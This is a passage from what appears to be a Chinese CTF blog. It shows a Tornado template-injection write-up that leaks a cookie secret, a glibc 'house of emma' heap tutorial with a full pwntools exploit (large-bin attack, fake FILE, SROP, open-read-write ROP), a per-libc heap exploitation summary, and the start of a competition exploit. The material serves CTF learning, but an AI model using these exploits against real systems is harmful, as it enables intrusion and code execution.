<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://97bda1b4-f8f6-434e-a6cc-59a79fcca907.node4.buuoj.cn:81/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;19ef00ca-a6f3-4408-a303-2d1a585ff706&#x27;&#125; </span><br></pre></td></tr></table></figure>

<p>得到提示信息，得到cookie_secret:19ef00ca-a6f3-4408-a303-2d1a585ff706</p>
<p>然后结合md5(cookie_secret+md5(filename))</p>
<p>即md5(‘19ef00ca-a6f3-4408-a303-2d1a585ff706’+md5(‘/fllllllllllllag’))</p>
<p>得到<br><img src="https://s1.z6r7.com/i/2022/11/17/3ukol.png"></p>
<p>然后得到payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=b6d767d2f8ed5d21a44b0e5886680cb9</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/11/house-of-emma/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/10/11/house-of-emma/" class="post-title-link" itemprop="url">house_of_emma</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-10-11 20:17:39 / Modified: 20:38:43" itemprop="dateCreated datePublished" datetime="2022-10-11T20:17:39+08:00">2022-10-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>Ayakaaaa师傅的一个demo:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;assert.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  size_t target = 0;</span><br><span class="line">  size_t *p1 = malloc(0x428);</span><br><span class="line">  size_t *g1 = malloc(0x18);</span><br><span class="line">  size_t *p2 = malloc(0x418);</span><br><span class="line">  size_t *g2 = malloc(0x18);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(0x438);</span><br><span class="line">  free(p2);</span><br><span class="line">  p1[3] = (size_t)((&amp;target)-4);</span><br><span class="line">  size_t *g4 = malloc(0x438);</span><br><span class="line">  assert((size_t)(p2-2) == target);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先申请4个heap</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/11/4c50601a1cf06d9e.png"></p>
<p>然后将大一些的chunkp1释放掉，再申请一个更大的chunk,将p1放进largebin中：</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/11/89098bff8dc8b569.png"></p>
<p>然后释放掉p2，再修改p1的bk_nextsize为&amp;target-0x20</p>
<p><img src="https://tuchuangs.com/imgs/2022/10/11/891cef9b0140c8b0.png"></p>
<p>可以看到，p2进入了unsortedbin，p1的bk_nextsize被我们成功修改，接下来再申请一个大的chunk的时候，就会将p2放进largebin中，也就是在这个插入的过程中触发了我们的攻击流程。</p>
<p>最后就是target会被写入p1的地址，p2进入largebin,达到一个任意地址写入一个堆地址的效果</p>
<h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>当程序没有显示调用exit，也不会通过主函数返回，那么以往我们使用的FSOP就无法进行了，如果此时两个hook也没法利用，我们需要一种能够稳定触发IO中函数的路径，这就是house of kiwi,它利用了__malloc_assert</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">       const char *function)</span><br><span class="line">&#123;</span><br><span class="line">(void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;,</span><br><span class="line">           __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (stderr);</span><br><span class="line">abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码中可以看到这个断言中调用了fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync<br>在house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改sync指针，并且在调用的时候还发现，rdx也很稳定的是IO_helper_jumps，此时如果我们通过任意地址写将sync指针改成setcontext+0x61，且将IO_helper_jumps+0xa0和IO_helper_jumps+0xa8改写，就可以实现栈迁移orw。</p>
<h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><p>house of kiwi之所以被称为house of emma的前置知识，是因为他提供了一条调用链，house of kiwi所找到的是在assert的时候会稳定的去调用_IO_file_jumps中的sync，后续需要通过任意地址写修改sync以及其他东西，而house of emma是直接将虚表的偏移修改，修改之后，本来应该调用_IO_file_jumps中的sync，变成了调用wjh发现的几个危险的函数，这几个危险函数可以仅仅通过精心布置fake FILE实现srop，并不需要任意地址写任意内容，只需要能够做到任意地址写已知的堆地址即可，这样的条件是非常低的，largebin attack就可以做到。<br><strong>大致流程：</strong></p>
<p>1.修改stderr的指针为已知堆地址<br> 2.修改TLS上的guard为已知值<br> 3.构造fake FILE<br> 4.触发house of kiwi（可以通过unsortedbin 与 top chunk合并来触发）<br> 5.执行srop和orw</p>
<p>除了上面介绍的那个函数，还有几个函数也存在类似的调用过程：<br> _IO_cookie_write<br> _IO_cookie_seek<br> _IO_cookie_close<br> 偏移略有不同，不过打法一模一样</p>
<p>wjh师傅的exp:(可以当作模板用)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"># sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">libc = ELF(&#x27;./lib/libc.so.6&#x27;)</span><br><span class="line">all_payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, size):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x1)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(size)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x3)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x2)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, buf):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x4)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(len(buf))</span><br><span class="line">    payload += str(buf)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_opcode():</span><br><span class="line">    global all_payload</span><br><span class="line">    all_payload += p8(5)</span><br><span class="line">    sh.sendafter(&quot;Pls input the opcode&quot;, all_payload)</span><br><span class="line">    all_payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># leak libc_base</span><br><span class="line">add(0, 0x410)</span><br><span class="line">add(1, 0x410)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">add(3, 0x410)</span><br><span class="line">delete(2)</span><br><span class="line">add(4, 0x430)</span><br><span class="line">show(2)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, &#x27;\x00&#x27;)) - 0x1f30b0  # main_arena + 1104</span><br><span class="line">log.success(&quot;libc_base:\t&quot; + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">guard = libc_base + 0x2035f0</span><br><span class="line">pop_rdi_addr = libc_base + 0x2daa2</span><br><span class="line">pop_rsi_addr = libc_base + 0x37c0a</span><br><span class="line">pop_rax_addr = libc_base + 0x446c0</span><br><span class="line">syscall_addr = libc_base + 0x883b6</span><br><span class="line">gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br><span class="line">setcontext_addr = libc_base + 0x50bc0</span><br><span class="line"></span><br><span class="line"># leak heapbase</span><br><span class="line">edit(2, &quot;a&quot; * 0x10)</span><br><span class="line">show(2)</span><br><span class="line">run_opcode()</span><br><span class="line">sh.recvuntil(&quot;a&quot; * 0x10)</span><br><span class="line">heap_base = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;)) - 0x2ae0</span><br><span class="line">log.success(&quot;heap_base:\t&quot; + hex(heap_base))</span><br><span class="line"></span><br><span class="line"># largebin attack stderr</span><br><span class="line">delete(0)</span><br><span class="line">edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym[&#x27;stderr&#x27;] - 0x20))</span><br><span class="line">add(5, 0x430)</span><br><span class="line">edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)</span><br><span class="line">edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)</span><br><span class="line">add(0, 0x410)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line"># largebin attack guard</span><br><span class="line">delete(2)</span><br><span class="line">add(6, 0x430)</span><br><span class="line">delete(0)</span><br><span class="line">edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))</span><br><span class="line">add(7, 0x450)</span><br><span class="line">edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)</span><br><span class="line">edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">add(0, 0x410)</span><br><span class="line"></span><br><span class="line"># change top chunk size</span><br><span class="line">delete(7)</span><br><span class="line">add(8, 0x430)</span><br><span class="line">edit(7, &#x27;a&#x27; * 0x438 + p64(0x300))</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">next_chain = 0</span><br><span class="line">srop_addr = heap_base + 0x2ae0 + 0x10</span><br><span class="line">fake_IO_FILE = 2 * p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_write_base = 0</span><br><span class="line">fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_base</span><br><span class="line">fake_IO_FILE += p64(0)  # _IO_buf_end</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heap_base)  # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libc.sym[&#x27;_IO_cookie_jumps&#x27;] + 0x40)  # vtable</span><br><span class="line">fake_IO_FILE += p64(srop_addr)  # rdi</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))</span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = fake_frame_addr + 0xF8</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rsp = fake_frame_addr + 0xF8 + 0x10</span><br><span class="line">frame.rip = pop_rdi_addr + 1  # : ret</span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rax_addr,  # sys_open(&#x27;flag&#x27;, 0)</span><br><span class="line">    2,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)</span><br><span class="line">    0,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    3,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + 0x200,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  # sys_write(1, heap, 0x100)</span><br><span class="line">    1,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    1,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + 0x200,</span><br><span class="line">    syscall_addr</span><br><span class="line">]</span><br><span class="line">payload = p64(0) + p64(fake_frame_addr) + &#x27;\x00&#x27; * 0x10 + p64(setcontext_addr + 61)</span><br><span class="line">payload += str(frame).ljust(0xF8, &#x27;\x00&#x27;)[0x28:] + &#x27;flag&#x27;.ljust(0x10, &#x27;\x00&#x27;) + flat(rop_data)</span><br><span class="line"></span><br><span class="line">edit(0, fake_IO_FILE)</span><br><span class="line">edit(2, payload)</span><br><span class="line"></span><br><span class="line">add(8, 0x450)  # House OF Kiwi</span><br><span class="line"># gdb.attach(sh, &quot;b _IO_cookie_write&quot;)</span><br><span class="line">run_opcode()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">堆利用总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-10-02 11:12:46 / Modified: 20:03:28" itemprop="dateCreated datePublished" datetime="2022-10-02T11:12:46+08:00">2022-10-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="libc-2-23"><a href="#libc-2-23" class="headerlink" title="libc-2.23"></a>libc-2.23</h1><ol>
<li>在libc2.23的版本下最常用的利用方法就是利用fastbin attack打malloc_hook，写onegadget（注意需要找一个\x7f作为chunk的size字段即malloc_hook-0x23，绕过fastbin的检测）</li>
<li>劫持bss段的heap数组，劫持为free_hook，稳定getshell</li>
<li>在relro没完全开启的时候去劫持got表</li>
</ol>
<h1 id="libc-2-27"><a href="#libc-2-27" class="headerlink" title="libc-2.27"></a>libc-2.27</h1><p>2.27最大的变化就是引入了tcache，tcache bin和fastbin的管理方式很像，都采用FILO的单链表（理解为数据结构中的栈），但是tcache的优先级更高，并且在bin中，fastbin的fd指针指向上一个chunk的头部，而tcache会指向上一个chunk的数据部分。旧版libc2.27中，tcache结构体没有引入key指针，可以随意double free，基本上是指哪儿打哪儿，在UAF下，使得利用手法更为容易，并且在分配的过程中没有对size进行检查。</p>
<p>1.首先泄露libc基址时，可以填满7个0xa0的tcache，然后利用uaf泄露出unsorted bin的fd指针从而泄露出libc基址</p>
<p>2.如果对堆块大小申请没有限制也可以直接申请一个0x420的堆块释放成为largebin，也可以直接通过泄露出largebin 的fd指针来泄露出libc基址</p>
<p>tcache利用：因为tcache的fd指针是指向的userdata，不像fastbin的fd指针一样指向堆块的头部，所以可以直接通过double free形成的指哪打哪的效果，修改free_hook为system_addr，然后释放一个里面写了’/bin/sh\x00‘的堆块来获得shell</p>
<h1 id="libc-2-31"><a href="#libc-2-31" class="headerlink" title="libc-2.31"></a>libc-2.31</h1><p>新版libc2.27和2.31类似，引入了新的内容key，如果key值等于tcache的地址，那么就进入tcache的链表，然后后移，判断当前堆块是否在链表中，如果在链表中，那么很显然就是double free了。绕过方法很简单，利用漏洞改掉key值即可，直接给干掉if判断了，就不会进入这个if分支了。 在UAF下的利用手法为首先填满tcache，然后申请unsorted bin大小的chunk，利用UAF泄露libc基址，最后通过修改tcache的指针轻松的将堆块申请到__free_hook，修改为system地址，然后free一个chunk，chunk的内容为”/bin/shx00”即可轻松getshell。</p>
<h1 id="libc-2-32"><a href="#libc-2-32" class="headerlink" title="libc-2.32"></a>libc-2.32</h1><p>2.32引入了一个宏<code>PROTECT_PTR，加入了一个safelink机制</code>,检测了申请地址是否以0x10对齐,fastbin attack的利用方法受到限制,例如经典的错位构造’\x7f’，劫持malloc_hook,和IO_FILE的利用方法（基本上都开始采用tcache来任意申请堆块了）</p>
<p>并且在这个版本开始，还增加了一个堆tcache 的fd指针进行异或的加密,在UAF的场景下，我们可以直接用show即可泄露出e-&gt;next值，因为最初tcache链表是为空的，也就是说safe-linking机制只相当于用堆地址右移了12位，通过左移即可恢复出堆地址，从而泄露出堆的基址，泄露出堆地址以后就可以来伪造tcache的next位了，将想改写的地址和key异或一下就可以直接修改tcache的fd指针了，一样可以将tcache指向free_hook来获得shell</p>
<h1 id="libc-2-34（已经逐渐淘汰）"><a href="#libc-2-34（已经逐渐淘汰）" class="headerlink" title="libc-2.34（已经逐渐淘汰）"></a>libc-2.34（已经逐渐淘汰）</h1><p>移除了几个hook符号：</p>
<p>__free_hook</p>
<p>__malloc_hook</p>
<p>__realloc_hook</p>
<p>__memalign_hook</p>
<p>__after_morecore_hook</p>
<p>获得shell的几个方法：</p>
<p>1.泄露完libc之后，通过计算偏移来泄露出environ指针的内容，来泄露出栈的地址，在栈上写rop链</p>
<p>2.劫持exit_hook（注意2.34-0ubuntu3.2之后exit_hook也不行了）</p>
<h1 id="libc-2-35"><a href="#libc-2-35" class="headerlink" title="libc-2.35"></a>libc-2.35</h1><p>相关的虚表已经不可以写了</p>
<p>平常最常用的攻击手法就是house of banana,house of apple,house of cat</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" class="post-title-link" itemprop="url">柏鹭杯</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-09-22 20:50:25" itemprop="dateCreated datePublished" datetime="2022-09-22T20:50:25+08:00">2022-09-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-10-02 14:23:09" itemprop="dateModified" datetime="2022-10-02T14:23:09+08:00">2022-10-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/cometition/" itemprop="url" rel="index"><span itemprop="name">cometition</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="柏鹭杯复现"><a href="#柏鹭杯复现" class="headerlink" title="柏鹭杯复现"></a>柏鹭杯复现</h1><h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note1&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = 